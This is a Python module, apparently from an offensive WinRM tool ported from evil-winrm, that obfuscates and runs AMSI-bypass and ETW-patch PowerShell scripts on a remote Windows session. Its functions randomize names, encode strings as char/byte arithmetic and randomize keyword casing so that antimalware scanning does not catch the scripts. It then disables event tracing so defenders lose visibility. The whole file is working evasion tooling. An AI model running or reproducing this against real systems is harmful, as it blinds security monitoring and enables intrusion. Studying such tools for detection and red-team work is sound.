# ruff: noqa: S311, PLR2004
"""Bypass AMSI in the current session."""
import random
import re
import string
from re import Pattern
from typing import TYPE_CHECKING

from devious_winrm.util.get_command_output import get_command_output
from devious_winrm.util.misc import get_pwsh_script
from devious_winrm.util.printers import print_error, print_info

if TYPE_CHECKING:
    from psrp import SyncRunspacePool

WORDS_RANDOM_CASE: list[str] = [
    "[Runtime.InteropServices.Marshal]",
    "System.Runtime.InteropServices.Marshal",
    "System.Reflection.Emit.AssemblyBuilderAccess",
    "System.Reflection.CallingConventions",
    "System.Reflection.AssemblyName",
    "System.MulticastDelegate",
    "GetDelegateForFunctionPointer",
    "Import-PowerShellDataFile",
    "ImportSystemModules",
    "New-TemporaryFile",
    ".MakeByRefType",
    ".CreateType",
    ".DefineConstructor",
    ".DefineMethod",
    ".DefineDynamicModule",
    "function ",
    "WriteByte",
    "[Ref]",
    "Assembly.GetType",
    "GetField",
    "[System.Net.WebUtility]",
    "HtmlDecode",
    "Reflection.BindingFlags",
    "NonPublic",
    "Static",
    "GetValue",
    "ForEach-Object",
    "Where-Object",
    "Select-Object",
    ".name",
    "showmethods",
    "function:",
    ".CommandType",
    "-contains",
    "-notmatch",
    "-like",
    "-notlike",
    "-notcontains",
    "-and",
    "ls ",
    "$global",
    "-Property",
]

KEYWORD_PATTERN: Pattern[str] =\
    re.compile("|".join(re.escape(w) for w in WORDS_RANDOM_CASE), re.IGNORECASE)

def random_case(word: str) -> str:
    """Randomly changes the casing of each character in a word."""
    return "".join(
        c.upper() if random.random() < 0.5 else c.lower() for c in word)

def random_string(length: int = 3) -> str:
    """Generate a random alphanumeric string of a specified length."""
    characters = string.ascii_letters + string.digits
    return "".join(random.choices(characters, k=length))

def replace_placeholder(template: str, placeholder: str, str_value: str) -> str:
    """Replace all occurrences of a placeholder in a string template with a new value.

    Args:
        template: The string containing the placeholder.
        placeholder: The specific substring to be replaced.
        str_value: The value to insert in place of the placeholder.

    Returns:
        The template string with all placeholders replaced.

    """
    return template.replace(placeholder, str_value)

def get_char_expression(the_char: str) -> str:
    """Generate a randomized PowerShell-style character expression.

    This function creates a string that represents a character's ASCII value
    through a random calculation to obfuscate its true value.

    Args:
        the_char: The single character to obfuscate.

    Returns:
        An obfuscated string expression for the character.

    """
    rand_val = random.randint(1, 10000) + random.randint(1, 100)
    val = ord(the_char) + rand_val
    char_val = random_case("char")
    return f"[{char_val}]({val}-{rand_val})"

def get_byte_expression(the_char: str) -> str:
    """Generate a randomized PowerShell-style byte-based character expression.

    Similar to `get_char_expression`, but uses hexadecimal byte values and a random
    calculation to represent the character, providing another layer of obfuscation.

    Args:
        the_char: The single character to obfuscate.

    Returns:
        An obfuscated string expression for the character using byte arithmetic.

    """
    rand_val = random.randint(30, 120)
    val = ord(the_char) + rand_val
    char_val = random_case("char")
    byte_val = random_case("byte")
    return f"[{char_val}]([{byte_val}] 0x{val:x}-0x{rand_val:x})"

def generate_random_type_string(to_randomize: str) -> str:
    """Generate a string of obfuscated character or byte expressions joined by '+'.

    Each character in the input string is converted into either a character
    or a byte expression, chosen randomly, and then concatenated.

    Args:
        to_randomize: The input string to be obfuscated.

    Returns:
        A string of concatenated obfuscated character/byte expressions.

    """
    return "+".join([
        get_byte_expression(c) if random.random() < 0.25 else get_char_expression(c)
        for c in to_randomize
    ])

def replace_with_string_scan(template: str) -> str:
    """Scan a template for marked strings and replaces them with obfuscated versions.

    The function looks for strings enclosed by the "<><" marker and replaces them
    with a series of obfuscated character/byte expressions. If a marked string
    contains '|', it is treated as multiple parts to be obfuscated and rejoined.

    Args:
        template: The string template to scan for marked strings.

    Returns:
        The template with all marked strings replaced by their obfuscated equivalents.

    """
    a_mark = "<><"

    def replace_content(match: re.Match) -> str:
        """Inner function to handle the replacement logic for each match."""
        content = match.group(1)
        parts = content.split("|")
        return '+"|"+'.join(generate_random_type_string(part) for part in parts)

    return re.sub(
        f"{re.escape(a_mark)}(.*?){re.escape(a_mark)}",
        replace_content, template, flags=re.DOTALL)

def rand_casing_keywords(template: str) -> str:
    """Randomizes the casing of predefined keywords within a template string.

    This function uses a pre-compiled regex pattern to find specific keywords
    (from `WORDS_RANDOM_CASE`) and applies random casing to them.

    Args:
        template: The string template containing keywords to randomize.

    Returns:
        The template with the casing of all specified keywords randomized.

    """
    def replacement_func(match: re.Match) -> str:
        """Inner function to apply random casing to a regex match."""
        return random_case(match.group(0))

    return KEYWORD_PATTERN.sub(replacement_func, template)

def replace_func_var_name(template: str, function_name: str, replace_with: str) -> str:
    """Replace the function variable name placeholders in the given template string.

    Args:
        template (str): The template string containing the\
            function variable name placeholder.
        function_name (str): The name of the function variable to be replaced.
        replace_with (str): The string to replace the placeholder with. If not provided\
            or empty, a random string of length 15 to 32 will be generated.

    Returns:
        str: The template string with the function variable name placeholder replaced\
            by the specified string.

    """
    if not replace_with:
        replace_with = random_string(random.randint(15, 32))

    a_mark = ">><"
    func_placeholder = f"{a_mark}{function_name}{a_mark}"
    return replace_placeholder(template, func_placeholder, replace_with)

def obfuscate_4msi_bypass() -> str:
    """Obfuscate the AMSI bypass script.

    Decodes a base64-encoded AMSI bypass, replaces placeholders with random names,\
     obfuscates specific strings, and randomizes keyword casing before\
     printing the final result.

    This function, along with all other help functions in this file,\
     are taken from github.com/Hackplayers/evil-winrm. The functions\
     were then converted to Python. All credit goes to the original\
     authors.
    """
    result = get_pwsh_script("AMSI-Bypass.ps1.template")

    for i in range(1, 3):
        func_name: str = f"Get-{random_string(random.randint(7, 17))}"
        result = replace_placeholder(result, f">><FUNCTION{i}>><", func_name)

    for i in range(1, 13):
        var_name: str = f"${random_string(random.randint(7, 17))}"
        result = replace_placeholder(result, f">><VAR{i}>><", var_name)

    result = replace_with_string_scan(result)
    return rand_casing_keywords(result)

def obfuscate_etw_patch() -> str:
    """Obfuscate the ETW patch script."""
    result = get_pwsh_script("ETW-Patch.ps1.template")

    replacement_str = f"${random_string(random.choice(range(7, 18)))}"
    result = replace_func_var_name(result, "VAR1", replacement_str)
    result = replace_with_string_scan(result)
    return rand_casing_keywords(result)

def bypass_amsi(rp: "SyncRunspacePool") -> None:
    """Bypass AMSI on the current RunspacePool."""
    amsi_bypass_script = obfuscate_4msi_bypass()
    etw_patch_script = obfuscate_etw_patch()
    print_info("Bypassing AMSI...")
    output = get_command_output(rp, amsi_bypass_script)
    if output:
        print_error(output)
        return
    print_info("Patching ETW...")
    output = get_command_output(rp, etw_patch_script)
    if output:
            print_error(output)
            return
    print_info("AMSI and ETW sucessfuly patched.")
